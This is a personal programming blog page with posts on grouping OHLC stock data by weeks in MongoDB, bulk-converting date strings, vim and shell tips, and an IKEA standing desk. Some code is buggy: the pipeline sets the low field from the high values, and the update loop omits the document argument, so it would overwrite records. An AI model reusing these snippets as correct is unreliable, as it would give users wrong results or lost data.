<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Ricos New Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Ricos New Blog">
<meta property="og:url" content="http://midnightcodr.github.io/">
<meta property="og:site_name" content="Ricos New Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ricos New Blog">
<meta name="twitter:description">

  
    <link rel="alternative" href="/atom.xml" title="Ricos New Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">

  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Ricos New Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">I just love coding</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="submit" value="&#xF002;" class="search-form-submit"><input type="hidden" name="q" value="site:http://midnightcodr.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-OHLC-data-grouping-with-mongodb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/02/07/OHLC-data-grouping-with-mongodb/" class="article-date">
  <time datetime="2015-02-07T15:57:42.000Z" itemprop="datePublished">Feb 7 2015</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/02/07/OHLC-data-grouping-with-mongodb/">OHLC data grouping with mongodb</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>In this post I will demonstrate how to do data grouping with OHLC data using mongodb’s powerful aggregation framework.</p>
<h2 id="The_problem:">The problem:</h2>
<p>Group OHLC data every N weeks where N&gt;1, I should point out that doing weekly data grouping (when N==1) is a whole lot easier.</p>
<h2 id="Sample_Data:">Sample Data:</h2>
<figure class="highlight js"><figcaption><span>example data</span><a href="/downloads/code/mongodb_aggregation_data.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Data based on http://finance.yahoo.com/q/hp?s=QQQ+Historical+Prices */</span></div><div class="line">&gt; db.ohlc.find()</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa816995"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-06T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">103.92</span>, <span class="string">"H"</span> : <span class="number">104.17</span>, <span class="string">"L"</span> : <span class="number">102.76</span>, <span class="string">"C"</span> : <span class="number">103.13</span>, <span class="string">"V"</span> : <span class="number">32833800</span>, <span class="string">"A"</span> : <span class="number">103.13</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa816996"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-05T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">103.13</span>, <span class="string">"H"</span> : <span class="number">103.83</span>, <span class="string">"L"</span> : <span class="number">102.87</span>, <span class="string">"C"</span> : <span class="number">103.76</span>, <span class="string">"V"</span> : <span class="number">23605500</span>, <span class="string">"A"</span> : <span class="number">103.76</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa816997"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-04T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">102.54</span>, <span class="string">"H"</span> : <span class="number">103.55</span>, <span class="string">"L"</span> : <span class="number">102.31</span>, <span class="string">"C"</span> : <span class="number">102.87</span>, <span class="string">"V"</span> : <span class="number">34073200</span>, <span class="string">"A"</span> : <span class="number">102.87</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa816998"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-03T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">102.33</span>, <span class="string">"H"</span> : <span class="number">103.03</span>, <span class="string">"L"</span> : <span class="number">101.68</span>, <span class="string">"C"</span> : <span class="number">102.96</span>, <span class="string">"V"</span> : <span class="number">30750400</span>, <span class="string">"A"</span> : <span class="number">102.96</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa816999"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-02T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">101.33</span>, <span class="string">"H"</span> : <span class="number">102.07</span>, <span class="string">"L"</span> : <span class="number">99.75</span>, <span class="string">"C"</span> : <span class="number">101.98</span>, <span class="string">"V"</span> : <span class="number">43624700</span>, <span class="string">"A"</span> : <span class="number">101.98</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa81699a"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-01-30T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">101.8</span>, <span class="string">"H"</span> : <span class="number">102.58</span>, <span class="string">"L"</span> : <span class="number">100.96</span>, <span class="string">"C"</span> : <span class="number">101.1</span>, <span class="string">"V"</span> : <span class="number">42927600</span>, <span class="string">"A"</span> : <span class="number">101.1</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa81699b"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-01-29T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">100.83</span>, <span class="string">"H"</span> : <span class="number">102.08</span>, <span class="string">"L"</span> : <span class="number">99.96</span>, <span class="string">"C"</span> : <span class="number">101.89</span>, <span class="string">"V"</span> : <span class="number">46539700</span>, <span class="string">"A"</span> : <span class="number">101.89</span> }</div><div class="line">{ <span class="string">"_id"</span> : ObjectId(<span class="string">"54d65597daf0910dfa81699c"</span>), <span class="string">"S"</span> : <span class="string">"QQQ"</span>, <span class="string">"D"</span> : ISODate(<span class="string">"2015-01-28T00:00:00Z"</span>), <span class="string">"O"</span> : <span class="number">103.09</span>, <span class="string">"H"</span> : <span class="number">103.18</span>, <span class="string">"L"</span> : <span class="number">100.9</span>, <span class="string">"C"</span> : <span class="number">100.92</span>, <span class="string">"V"</span> : <span class="number">43591700</span>, <span class="string">"A"</span> : <span class="number">100.92</span> }</div><div class="line"><span class="comment">/* ... */</span></div></pre></td></tr></table></figure>

<h2 id="The_solution:">The solution:</h2>
<figure class="highlight js"><figcaption><span>mongo data grouping script</span><a href="/downloads/code/mongodb_aggregation.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">db.ohlc.aggregate({</div><div class="line">        $match: {</div><div class="line">            S: <span class="string">'QQQ'</span></div><div class="line">        }</div><div class="line">    }, {</div><div class="line">        $project: {</div><div class="line">            D: <span class="string">'$D'</span>, O: <span class="string">'$O'</span>, H: <span class="string">'$H'</span>, L: <span class="string">'$H'</span>, C: <span class="string">'$C'</span>, V: <span class="string">'$V'</span>, A: <span class="string">'$A'</span>,</div><div class="line">            weeknbr: {</div><div class="line">                $divide: [{</div><div class="line">                        $subtract: [</div><div class="line">                            <span class="string">'$D'</span>,</div><div class="line">                            <span class="keyword">new</span> ISODate(<span class="string">'1970-01-04'</span>)</div><div class="line">                        ]</div><div class="line">                    },</div><div class="line">                    <span class="number">86400</span> * <span class="number">7000</span></div><div class="line">                ]</div><div class="line">            }</div><div class="line">        }</div><div class="line">    }, {</div><div class="line">        $project: {</div><div class="line">            D: <span class="string">'$D'</span>, O: <span class="string">'$O'</span>, H: <span class="string">'$H'</span>, L: <span class="string">'$H'</span>, C: <span class="string">'$C'</span>, V: <span class="string">'$V'</span>, A: <span class="string">'$A'</span>,</div><div class="line">            rnd_weeknbr: {</div><div class="line">                $subtract: [</div><div class="line">                    <span class="string">'$weeknbr'</span>, {</div><div class="line">                        $mod: [</div><div class="line">                            <span class="string">'$weeknbr'</span>,</div><div class="line">                            <span class="number">1</span></div><div class="line">                        ]</div><div class="line">                    }</div><div class="line">                ]</div><div class="line">            }</div><div class="line">        }</div><div class="line">    }, {</div><div class="line">        $project: {</div><div class="line">            D: <span class="string">'$D'</span>, O: <span class="string">'$O'</span>, H: <span class="string">'$H'</span>, L: <span class="string">'$H'</span>, C: <span class="string">'$C'</span>, V: <span class="string">'$V'</span>, A: <span class="string">'$A'</span>,</div><div class="line">            grp_weeknbr: {</div><div class="line">                $subtract: [</div><div class="line">                    <span class="string">'$rnd_weeknbr'</span>, {</div><div class="line">                        $mod: [</div><div class="line">                            <span class="string">'$rnd_weeknbr'</span>,</div><div class="line">                            <span class="number">4</span></div><div class="line">                        ]</div><div class="line">                    }</div><div class="line">                ]</div><div class="line">            }</div><div class="line">        }</div><div class="line">    }, {</div><div class="line">        $sort: {</div><div class="line">            D: <span class="number">1</span></div><div class="line">        }</div><div class="line">    },</div><div class="line"></div><div class="line">    {</div><div class="line">        $group: {</div><div class="line">            _id: {</div><div class="line">                grp_weeknbr: <span class="string">'$grp_weeknbr'</span></div><div class="line">            },</div><div class="line">            D: {</div><div class="line">                $last: <span class="string">'$D'</span></div><div class="line">            },</div><div class="line">            O: {</div><div class="line">                $first: <span class="string">'$O'</span></div><div class="line">            },</div><div class="line">            H: {</div><div class="line">                $max: <span class="string">'$H'</span></div><div class="line">            },</div><div class="line">            L: {</div><div class="line">                $min: <span class="string">'$L'</span></div><div class="line">            },</div><div class="line">            C: {</div><div class="line">                $last: <span class="string">'$C'</span></div><div class="line">            },</div><div class="line">            A: {</div><div class="line">                $last: <span class="string">'$A'</span></div><div class="line">            },</div><div class="line">            V: {</div><div class="line">                $sum: <span class="string">'$V'</span></div><div class="line">            }</div><div class="line">        }</div><div class="line">    }, {</div><div class="line">        $sort: {</div><div class="line">            D: <span class="number">1</span></div><div class="line">        }</div><div class="line">    }</div><div class="line">)</div></pre></td></tr></table></figure>

<h2 id="The_explanation:">The explanation:</h2>
<p>The idea is to </p>
<ol>
<li>get the number of weeks (floating point) since a reference date (line #8-17, all OHLC data in the db are later than that date), the reason <code>1970-01-04</code> instead of <code>1970-01-01</code> (which is Wednesday)<br>is chosen is because it lands on Sunday.</li>
<li>get the floored number of weeks for step 2, line #22-31, since mongodb doesn’t have a <code>round</code> or <code>floor</code> method, this is the only way to get number of week since reference date in integer.</li>
<li>sort by D, this step is crucial as the next step will need to use method such as $last and $first to get the close and open price for the grouped period.</li>
<li>group by 4 weeks’ OHLC, line #37-40, number 4 on line #41 can be substituted based on data group unit.</li>
<li>sort by _id, which consists of the calculated grouping number grp_weeknbr from previous step.</li>
</ol>
<p>The reason why the number of weeks needs to be calculated based off a reference date is because of the partial week problem. See <a href="http://stackoverflow.com/questions/28389828/how-to-handle-partial-week-data-grouping-in-mongodb" target="_blank" rel="external">this SO question</a> that I asked before I came up with the solution documented in this post.</p>
<h2 id="Result:">Result:</h2>
<figure class="highlight js"><figcaption><span>data grouping result</span><a href="/downloads/code/mongodb_aggregation_result.js">download</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 0 */</span></div><div class="line">{</div><div class="line">    <span class="string">"result"</span> : [ </div><div class="line">        {</div><div class="line">            <span class="string">"_id"</span> : {</div><div class="line">                <span class="string">"grp_weeknbr"</span> : <span class="number">1520</span></div><div class="line">            },</div><div class="line">            <span class="string">"D"</span> : ISODate(<span class="string">"1999-03-19T00:00:00.000Z"</span>),</div><div class="line">            <span class="string">"O"</span> : <span class="number">102.25</span>,</div><div class="line">            <span class="string">"H"</span> : <span class="number">106.5</span>,</div><div class="line">            <span class="string">"L"</span> : <span class="number">102.31</span>,</div><div class="line">            <span class="string">"C"</span> : <span class="number">102.44</span>,</div><div class="line">            <span class="string">"A"</span> : <span class="number">46.98</span>,</div><div class="line">            <span class="string">"V"</span> : <span class="number">50912800</span></div><div class="line">        }, </div><div class="line">        {</div><div class="line">            <span class="string">"_id"</span> : {</div><div class="line">                <span class="string">"grp_weeknbr"</span> : <span class="number">1524</span></div><div class="line">            },</div><div class="line">            <span class="string">"D"</span> : ISODate(<span class="string">"1999-04-16T00:00:00.000Z"</span>),</div><div class="line">            <span class="string">"O"</span> : <span class="number">102.88</span>,</div><div class="line">            <span class="string">"H"</span> : <span class="number">112.5</span>,</div><div class="line">            <span class="string">"L"</span> : <span class="number">101</span>,</div><div class="line">            <span class="string">"C"</span> : <span class="number">103.94</span>,</div><div class="line">            <span class="string">"A"</span> : <span class="number">47.67</span>,</div><div class="line">            <span class="string">"V"</span> : <span class="number">182968000</span></div><div class="line">        }, </div><div class="line">		<span class="comment">/* ... */</span></div><div class="line">        {</div><div class="line">            <span class="string">"_id"</span> : {</div><div class="line">                <span class="string">"grp_weeknbr"</span> : <span class="number">2344</span></div><div class="line">            },</div><div class="line">            <span class="string">"D"</span> : ISODate(<span class="string">"2015-01-02T00:00:00.000Z"</span>),</div><div class="line">            <span class="string">"O"</span> : <span class="number">105.11</span>,</div><div class="line">            <span class="string">"H"</span> : <span class="number">105.57</span>,</div><div class="line">            <span class="string">"L"</span> : <span class="number">102.09</span>,</div><div class="line">            <span class="string">"C"</span> : <span class="number">102.94</span>,</div><div class="line">            <span class="string">"A"</span> : <span class="number">102.94</span>,</div><div class="line">            <span class="string">"V"</span> : <span class="number">695244900</span></div><div class="line">        }, </div><div class="line">        {</div><div class="line">            <span class="string">"_id"</span> : {</div><div class="line">                <span class="string">"grp_weeknbr"</span> : <span class="number">2348</span></div><div class="line">            },</div><div class="line">            <span class="string">"D"</span> : ISODate(<span class="string">"2015-01-30T00:00:00.000Z"</span>),</div><div class="line">            <span class="string">"O"</span> : <span class="number">102.5</span>,</div><div class="line">            <span class="string">"H"</span> : <span class="number">104.58</span>,</div><div class="line">            <span class="string">"L"</span> : <span class="number">100.95</span>,</div><div class="line">            <span class="string">"C"</span> : <span class="number">101.1</span>,</div><div class="line">            <span class="string">"A"</span> : <span class="number">101.1</span>,</div><div class="line">            <span class="string">"V"</span> : <span class="number">794977000</span></div><div class="line">        }, </div><div class="line">        {</div><div class="line">            <span class="string">"_id"</span> : {</div><div class="line">                <span class="string">"grp_weeknbr"</span> : <span class="number">2352</span></div><div class="line">            },</div><div class="line">            <span class="string">"D"</span> : ISODate(<span class="string">"2015-02-06T00:00:00.000Z"</span>),</div><div class="line">            <span class="string">"O"</span> : <span class="number">101.33</span>,</div><div class="line">            <span class="string">"H"</span> : <span class="number">104.17</span>,</div><div class="line">            <span class="string">"L"</span> : <span class="number">102.07</span>,</div><div class="line">            <span class="string">"C"</span> : <span class="number">103.13</span>,</div><div class="line">            <span class="string">"A"</span> : <span class="number">103.13</span>,</div><div class="line">            <span class="string">"V"</span> : <span class="number">164887600</span></div><div class="line">        }</div><div class="line">    ],</div><div class="line">    <span class="string">"ok"</span> : <span class="number">1</span></div><div class="line">}</div></pre></td></tr></table></figure>

<p><em>Note</em>: Last group (2015-02-06) contains only one-week (first week of the group) worth of data.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2015/02/07/OHLC-data-grouping-with-mongodb/" data-id="2rtbib80jpm8573z" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2015/02/07/OHLC-data-grouping-with-mongodb/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/11/22/How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes/" class="article-date">
  <time datetime="2014-11-23T04:40:01.000Z" itemprop="datePublished">Nov 22 2014</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/11/22/How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes/">How to convert 20 million datetime strings to ISODate in less than 30 minutes</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Recently I was faced with a task to correct one of the columns’ data type in a mongodb collection. The column is supposed to be in ISODate format (value example: “2014-10-13T09:48:00Z”) but unfortunately it’s saved as string type when the data collecting client populates the collection. The real challenge is the collection count is a little over 20 million. My first attempt is to convert the datatype (string) to the right one (ISODate) by iterating through the whole collection. The following mongo script is used:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> cursor=db.data.find( { D: { $not: { $type: <span class="number">9</span> } } } );  </div><div class="line"><span class="comment">// 9 is Date in mongodb, filter is used to prevent converting data type that is already Date</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>( cursor.hasNext() ) {</div><div class="line">    <span class="keyword">var</span> doc=cursor.next();</div><div class="line">    doc.D=ISODate(doc.D);   <span class="comment">// original doc.D is in string format</span></div><div class="line">    db.data.update(</div><div class="line">        { _id: doc._id },</div><div class="line">        { writeConcern: {w: <span class="number">0</span>} }    <span class="comment">// disable write concern to speed up updates</span></div><div class="line">    );</div><div class="line">}</div></pre></td></tr></table></figure>

<p>The code works, except it’s not fast enough. I am getting roughly 1.5K/second update speed (with writeConcern disabled, which is the fastest option) on my i3 hp laptop with 8GB RAM and SSD. It would take almost 4 hours to finish convertion. There needs to be a faster way. Through some experiments I found a much faster way:</p>
<ul>
<li>use mongodump to export the collection, result will be the bson formatted file <em>data.bson</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mongodump <span class="operator">-d</span> test -c data</div></pre></td></tr></table></figure>

<ul>
<li>use <code>bsondump</code> combined with an <code>sed</code> command to turn the datetime string field into ISODate field, end result is a json-formatted file <em>data.json</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bsondump data.bson | sed <span class="operator">-e</span> <span class="string">'s/"D" : "\(.*\)"/"D" : { "$date" : "\1" }/'</span> &gt; data.json</div></pre></td></tr></table></figure>

<ul>
<li>use <code>mongoimport</code> to import the file generated from previous step, <em>data.json</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mongoimport <span class="operator">-d</span> test -c data_new --type json --file data.json</div></pre></td></tr></table></figure>

<ul>
<li>confirm the new collection data_new has the correct date column, drop the original collection and rename data_new to data under mongo shell. The whole process took 23 minutes with the same hardware setup.</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2014/11/22/How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes/" data-id="6qa9fnsknpzew1b1" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2014/11/22/How-to-convert-20-million-datetime-strings-to-ISODate-in-less-than-30-minutes/#disqus_thread" class="article-comment-link">Comments</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mongodb/">mongodb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/programming/">programming</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sed/">sed</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Tips-to-make-the-life-of-coding-a-whole-lot-easier" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/" class="article-date">
  <time datetime="2014-11-02T19:14:07.000Z" itemprop="datePublished">Nov 2 2014</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/">Tips to make the life of coding a whole lot easier</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="If_you_are_using_vim,_you_should_give_the_following_plug-ins_a_try">If you are using vim, you should give the following plug-ins a try</h2>
<ul>
<li>comment/uncomment codes easy with <a href="https://github.com/tomtom/tcomment_vim" target="_blank" rel="external">tcomment-vim</a></li>
<li>syntax checking plugin <a href="https://github.com/scrooloose/syntastic" target="_blank" rel="external">Syntastic</a></li>
<li><a href="https://github.com/honza/vim-snippets" target="_blank" rel="external">snipMate</a> provides time-saving snippets for most of the programming languages</li>
<li><a href="https://github.com/airblade/vim-gitgutter" target="_blank" rel="external">vim-gitgutter</a> for better git integration</li>
<li><a href="https://github.com/maksimr/vim-jsbeautify" target="_blank" rel="external">vim-jsbeautify</a> for javascript code beautifying</li>
</ul>
<p>I have put together the above goodies into my <a href="https://github.com/midnightcodr/dotvim" target="_blank" rel="external">dotvim repo</a>. Use it if you like.</p>
<h2 id="Install_node_module_underscore-cli">Install node module <a href="https://github.com/ddopson/underscore-cli" target="_blank" rel="external">underscore-cli</a></h2>
<p>One of the useful features that I use almost daily is to format json data in more human-readable format.</p>
<h2 id="Use_$__to_reference_the_last_argument_in_the_last_shell_command">Use $_ to reference the last argument in the last shell command</h2>
<p>Example usage:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">mkdir</span> -<span class="keyword">p</span> /var/www/html/mysite/blog/</div><div class="line"><span class="keyword">vi</span> $_/<span class="built_in">index</span>.html</div></pre></td></tr></table></figure>

<h2 id="Use_pbcopy_if_you_are_using_Mac_OSX">Use pbcopy if you are using Mac OSX</h2>
<p><code>pbcopy</code> copies conent (from stdin) into clipboard, so if you have need to pipe the output of say, 20000 lines of text, into system clipboard, you can do</p>
<p><code>cat input_file|pbcopy</code></p>
<h2 id="Use_oh-my-zsh">Use oh-my-zsh</h2>
<p>It’s way more powerful than bash and I strongly recommend any programmer switch right away. With it you can do some very cool stuff like the followings</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd <span class="keyword">...</span> (the equivilent of cd ../..)</div><div class="line"><span class="comment"># you have folders ~/var/www/html/mysite/blog/ and ~/var/www/html/another/blog/ , your pwd is the first one (~/var/www/html/mysite/blog/) and you want to go into the second directory, simply do</span></div><div class="line">cd mysite another</div></pre></td></tr></table></figure>

<h2 id="Use_the_following_command_to_switch_between_current_and_the_previous_directories">Use the following command to switch between current and the previous directories</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> -</div></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://midnightcodr.github.io/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/" data-id="71qvuh9pgnit9wmh" class="article-share-link">Share</a>
      
        <a href="http://midnightcodr.github.io/2014/11/02/Tips-to-make-the-life-of-coding-a-whole-lot-easier/#disqus_thread" class="article-comment-link">Comments</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-i-just-built-my-first-standing-desk" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/03/23/i-just-built-my-first-standing-desk/" class="article-date">
  <time datetime="2014-03-23T21:38:00.000Z" itemprop="datePublished">Mar 23 2014</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/DIY/">DIY</a>►<a class="article-category-link" href="/categories/DIY/fun/">fun</a>►<a class="article-category-link" href="/categories/DIY/fun/standing-desk/">standing desk</a>►<a class="article-category-link" href="/categories/DIY/fun/standing-desk/ikea/">ikea</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/03/23/i-just-built-my-first-standing-desk/">I just built my first standing desk</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="So_it’s_for_real">So it’s for real</h2>
<p>I’ve always wanted to build a standing desk using Ikea parts. Other people have done it with Finnvard height adjustable table legs (<a href="http://www.ikea.com/us/en/catalog/products/00144763/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/00144763/</a>) and a table top. My plan was put off because the Long Island Ikdea store discontinued the Finnvard legs for some time. I was lucky to find them in-store again this weekend and Voilà - my dream desk is finally built:</p>
<img src="/images/standing_desk_1.JPG" class="center"><br><img src="/images/standing_desk_2.JPG" class="left"><br><img src="/images/standing_desk_3.JPG" class="center">

<p>I bought this $40 stool just incase I need to take a short break from standing:<br><a href="http://www.ikea.com/us/en/catalog/products/50199215/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/50199215/</a></p>
<p>I also like the fact that I am able to stuff my laser printer onto the shell:</p>
<img src="/images/standing_desk_4.JPG" class="center">

<h2 id="Here’s_the_recipe">Here’s the recipe</h2>
<p>1 x Linnmon table top, <a href="http://www.ikea.com/us/en/catalog/products/50251350/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/50251350/</a>, $40</p>
<p>2 x Finnvard table legs <a href="http://www.ikea.com/us/en/catalog/products/00144763/" target="_blank" rel="external">http://www.ikea.com/us/en/catalog/products/00144763/</a>, $30 ea</p>
